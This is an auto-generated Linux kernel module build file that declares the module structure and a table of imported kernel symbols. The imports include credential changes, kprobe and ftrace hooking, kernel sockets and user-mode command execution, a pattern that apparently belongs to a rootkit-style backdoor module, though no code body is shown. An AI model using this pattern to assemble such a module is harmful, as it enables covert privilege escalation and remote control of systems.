#include <linux/module.h>
#include <linux/export-internal.h>
#include <linux/compiler.h>

MODULE_INFO(name, KBUILD_MODNAME);

__visible struct module __this_module
__section(".gnu.linkonce.this_module") = {
	.name = KBUILD_MODNAME,
	.init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
	.exit = cleanup_module,
#endif
	.arch = MODULE_ARCH_INIT,
};



static const struct modversion_info ____versions[]
__used __section("__versions") = {
	{ 0xe04387bd, "prepare_creds" },
	{ 0x122d1043, "commit_creds" },
	{ 0x3f66a26e, "register_kprobe" },
	{ 0xbb10e61d, "unregister_kprobe" },
	{ 0x362f9a8, "__x86_indirect_thunk_r12" },
	{ 0x5cb9bbc, "ftrace_set_filter_ip" },
	{ 0x6b378edc, "register_ftrace_function" },
	{ 0x8aa23021, "unregister_ftrace_function" },
	{ 0xec859d50, "kthread_stop" },
	{ 0x42d0d5a, "sock_release" },
	{ 0xa7eedcc4, "call_usermodehelper" },
	{ 0xf0fdf6cb, "__stack_chk_fail" },
	{ 0x2d353450, "init_net" },
	{ 0x7b4d8539, "sock_create_kern" },
	{ 0xdf537e48, "kthread_create_on_node" },
	{ 0x6d615166, "wake_up_process" },
	{ 0xf9a482f9, "msleep" },
	{ 0x618077d3, "kernel_sendmsg" },
	{ 0xa962af3f, "kernel_recvmsg" },
	{ 0x4c03a563, "random_kmalloc_seed" },
	{ 0xbfc3ca1f, "kmalloc_caches" },
	{ 0x82f89ee0, "__kmalloc_cache_noprof" },
	{ 0xb3f7646e, "kthread_should_stop" },
	{ 0x5a921311, "strncmp" },
	{ 0x37a0cba, "kfree" },
	{ 0xbdfb6dbb, "__fentry__" },
	{ 0x65487097, "__x86_indirect_thunk_rax" },
	{ 0x5b8239ca, "__x86_return_thunk" },
	{ 0x87a21cb3, "__ubsan_handle_out_of_bounds" },
	{ 0x122c3a7e, "_printk" },
	{ 0x5ec55c4a, "module_layout" },
};

MODULE_INFO(depends, "");


MODULE_INFO(srcversion, "4E93ED60B1445F3F3C91EC5");
